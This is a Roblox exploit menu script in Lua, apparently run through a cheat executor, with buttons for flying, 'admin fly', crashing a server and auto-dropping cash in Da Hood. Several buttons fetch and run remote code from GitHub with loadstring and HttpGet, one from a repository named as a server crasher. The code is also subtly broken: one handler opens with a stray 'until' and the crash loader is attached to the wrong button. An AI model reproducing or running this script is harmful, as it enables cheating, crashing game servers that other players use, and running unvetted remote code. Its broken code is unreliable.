-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local STARCODE = Instance.new("Frame")
local Label = Instance.new("TextLabel")
local Label_2 = Instance.new("TextLabel")
local Made = Instance.new("TextLabel")
local Label_3 = Instance.new("TextLabel")
local Label_4 = Instance.new("TextLabel")
local FLY = Instance.new("TextButton")
local ADMINFLY = Instance.new("TextButton")
local Crash = Instance.new("TextButton")
local Label_5 = Instance.new("TextLabel")
local Label_6 = Instance.new("TextLabel")
local AutoDrop = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

STARCODE.Name = "STARCODE"
STARCODE.Parent = ScreenGui
STARCODE.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
STARCODE.BorderColor3 = Color3.fromRGB(53, 53, 53)
STARCODE.BorderSizePixel = 0
STARCODE.Position = UDim2.new(0.265433192, 0, 0.2370518, 0)
STARCODE.Size = UDim2.new(0, 769, 0, 333)
STARCODE.Active = true
STARCODE.Draggable = true

Label.Name = "Label"
Label.Parent = STARCODE
Label.BackgroundColor3 = Color3.fromRGB(255, 206, 206)
Label.BackgroundTransparency = 1.000
Label.BorderSizePixel = 0
Label.Position = UDim2.new(0.018205462, 0, 0.0630630627, 0)
Label.Size = UDim2.new(0, 175, 0, 50)
Label.Font = Enum.Font.SourceSans
Label.Text = "STARCODE"
Label.TextColor3 = Color3.fromRGB(255, 230, 84)
Label.TextScaled = true
Label.TextSize = 14.000
Label.TextWrapped = true

Label_2.Name = "Label"
Label_2.Parent = STARCODE
Label_2.BackgroundColor3 = Color3.fromRGB(0, 4, 255)
Label_2.Position = UDim2.new(0.018205462, 0, 0.195195198, 0)
Label_2.Size = UDim2.new(0, 187, 0, 6)
Label_2.Font = Enum.Font.SourceSans
Label_2.Text = ""
Label_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Label_2.TextSize = 14.000

Made.Name = "Made"
Made.Parent = STARCODE
Made.BackgroundColor3 = Color3.fromRGB(0, 255, 21)
Made.BackgroundTransparency = 1.000
Made.BorderSizePixel = 0
Made.Position = UDim2.new(0.80624187, 0, 0.828828871, 0)
Made.Size = UDim2.new(0, 149, 0, 49)
Made.Font = Enum.Font.SourceSansSemibold
Made.Text = "Made by Deadlygio#7805"
Made.TextColor3 = Color3.fromRGB(255, 255, 255)
Made.TextScaled = true
Made.TextSize = 14.000
Made.TextStrokeColor3 = Color3.fromRGB(115, 255, 1)
Made.TextStrokeTransparency = -1.000
Made.TextWrapped = true

Label_3.Name = "Label"
Label_3.Parent = STARCODE
Label_3.BackgroundColor3 = Color3.fromRGB(4, 3, 2)
Label_3.BorderSizePixel = 0
Label_3.Position = UDim2.new(0.00910273101, 0, 0.270270288, 0)
Label_3.Size = UDim2.new(0, 200, 0, 43)
Label_3.Font = Enum.Font.Cartoon
Label_3.Text = "BODY"
Label_3.TextColor3 = Color3.fromRGB(255, 0, 0)
Label_3.TextScaled = true
Label_3.TextSize = 14.000
Label_3.TextStrokeColor3 = Color3.fromRGB(12, 32, 214)
Label_3.TextStrokeTransparency = 0.000
Label_3.TextWrapped = true

Label_4.Name = "Label"
Label_4.Parent = STARCODE
Label_4.BackgroundColor3 = Color3.fromRGB(255, 64, 0)
Label_4.BorderColor3 = Color3.fromRGB(97, 6, 92)
Label_4.BorderSizePixel = 0
Label_4.Position = UDim2.new(0.00910273101, 0, 0.3993994, 0)
Label_4.Size = UDim2.new(0, 200, 0, 8)
Label_4.Font = Enum.Font.SourceSans
Label_4.Text = ""
Label_4.TextColor3 = Color3.fromRGB(0, 0, 0)
Label_4.TextSize = 14.000

FLY.Name = "FLY"
FLY.Parent = STARCODE
FLY.BackgroundColor3 = Color3.fromRGB(7, 214, 255)
FLY.Position = UDim2.new(0.0174893495, 0, 0.505706906, 0)
FLY.Size = UDim2.new(0, 200, 0, 59)
FLY.Font = Enum.Font.Cartoon
FLY.Text = "FLY(F)"
FLY.TextColor3 = Color3.fromRGB(0, 0, 0)
FLY.TextScaled = true
FLY.TextSize = 14.000
FLY.TextWrapped = true
FLY.MouseButton1Down:connect(function()
	until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local torso = plr.Character.Head 
local flying = false
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 400 
local speed = 5000 

function Fly() 
	local bg = Instance.new("BodyGyro", torso) 
	bg.P = 9e4 
	bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
	bg.cframe = torso.CFrame 
	local bv = Instance.new("BodyVelocity", torso) 
	bv.velocity = Vector3.new(0,0.1,0) 
	bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
	repeat wait() 
		plr.Character.Humanoid.PlatformStand = true 
		if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
			speed = speed+.10+(speed/maxspeed) 
			if speed > maxspeed then 
				speed = maxspeed 
			end 
		elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
			speed = speed-1 
			if speed < 0 then 
				speed = 0 
			end 
		end 
		if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
			bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
			lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
		elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
			bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
		else 
			bv.velocity = Vector3.new(0,0.1,0) 
		end 
		bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
	until not flying 
	ctrl = {f = 0, b = 0, l = 0, r = 0} 
	lastctrl = {f = 0, b = 0, l = 0, r = 0} 
	speed = 0 
	bg:Destroy() 
	bv:Destroy() 
	plr.Character.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
	if key:lower() == "f" then 
		if flying then flying = false 
		else 
			flying = true 
			Fly() 
		end 
	elseif key:lower() == "w" then 
		ctrl.f = 1 
	elseif key:lower() == "s" then 
		ctrl.b = -1 
	elseif key:lower() == "a" then 
		ctrl.l = -1 
	elseif key:lower() == "d" then 
		ctrl.r = 1 
	end 
end) 
mouse.KeyUp:connect(function(key) 
	if key:lower() == "w" then 
		ctrl.f = 0 
	elseif key:lower() == "s" then 
		ctrl.b = 0 
	elseif key:lower() == "a" then 
		ctrl.l = 0 
	elseif key:lower() == "d" then 
		ctrl.r = 0 
	end 
end)
Fly()
end)

ADMINFLY.Name = "ADMIN FLY"
ADMINFLY.Parent = STARCODE
ADMINFLY.BackgroundColor3 = Color3.fromRGB(7, 214, 255)
ADMINFLY.Position = UDim2.new(0.0174893495, 0, 0.751953125, 0)
ADMINFLY.Size = UDim2.new(0, 200, 0, 59)
ADMINFLY.Font = Enum.Font.Cartoon
ADMINFLY.Text = "ADMIN FLY(X)"
ADMINFLY.TextColor3 = Color3.fromRGB(0, 0, 0)
ADMINFLY.TextScaled = true
ADMINFLY.TextSize = 14.000
ADMINFLY.TextWrapped = true
ADMINFLY.MouseButton1Down:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/swag/main/admin_fly"))()
end)

Crash.Name = "Crash"
Crash.Parent = STARCODE
Crash.BackgroundColor3 = Color3.fromRGB(255, 0, 38)
Crash.Position = UDim2.new(0.29908973, 0, 0.505706906, 0)
Crash.Size = UDim2.new(0, 200, 0, 64)
Crash.Font = Enum.Font.Cartoon
Crash.Text = "Crash Server 100k needed(SwagMode)"
Crash.TextColor3 = Color3.fromRGB(255, 255, 255)
Crash.TextScaled = true
Crash.TextSize = 14.000
Crash.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
Crash.TextWrapped = true
ADMINFLY.MouseButton1Down:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
end)

Label_5.Name = "Label"
Label_5.Parent = STARCODE
Label_5.BackgroundColor3 = Color3.fromRGB(21, 0, 255)
Label_5.BackgroundTransparency = 1.000
Label_5.Position = UDim2.new(0.29908973, 0, 0.291291296, 0)
Label_5.Size = UDim2.new(0, 200, 0, 50)
Label_5.Font = Enum.Font.SourceSans
Label_5.Text = "SELLING TOOLS"
Label_5.TextColor3 = Color3.fromRGB(0, 255, 238)
Label_5.TextScaled = true
Label_5.TextSize = 14.000
Label_5.TextWrapped = true

Label_6.Name = "Label"
Label_6.Parent = STARCODE
Label_6.BackgroundColor3 = Color3.fromRGB(0, 12, 255)
Label_6.BorderColor3 = Color3.fromRGB(97, 6, 92)
Label_6.BorderSizePixel = 0
Label_6.Position = UDim2.new(0.29908973, 0, 0.3993994, 0)
Label_6.Size = UDim2.new(0, 200, 0, 8)
Label_6.Font = Enum.Font.SourceSans
Label_6.Text = ""
Label_6.TextColor3 = Color3.fromRGB(0, 0, 0)
Label_6.TextSize = 14.000

AutoDrop.Name = "AutoDrop"
AutoDrop.Parent = STARCODE
AutoDrop.BackgroundColor3 = Color3.fromRGB(255, 0, 38)
AutoDrop.Position = UDim2.new(0.29908973, 0, 0.736938119, 0)
AutoDrop.Size = UDim2.new(0, 200, 0, 64)
AutoDrop.Font = Enum.Font.Cartoon
AutoDrop.Text = "Auto Drop(SwagMode)"
AutoDrop.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoDrop.TextScaled = true
AutoDrop.TextSize = 14.000
AutoDrop.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
AutoDrop.TextWrapped = true
AutoDrop.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Raycodex/Exploiting/main/Roblox/Da%20Hood%20Auto%20Cash%20Drop"), true))()
end)

TextLabel.Parent = STARCODE
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.568270564, 0, 0.135135129, 0)
TextLabel.Size = UDim2.new(0, 332, 0, 167)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "MORE SOON LOL"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

-- Scripts:

local function YDRKOR_fake_script() -- Label_2.LocalScript 
	local script = Instance.new('LocalScript', Label_2)

	
		function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end
	
		counter = 0
	
		while wait(0.01) do
			script.Parent.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
	
			counter = counter + 0.01
		end
end
coroutine.wrap(YDRKOR_fake_script)()
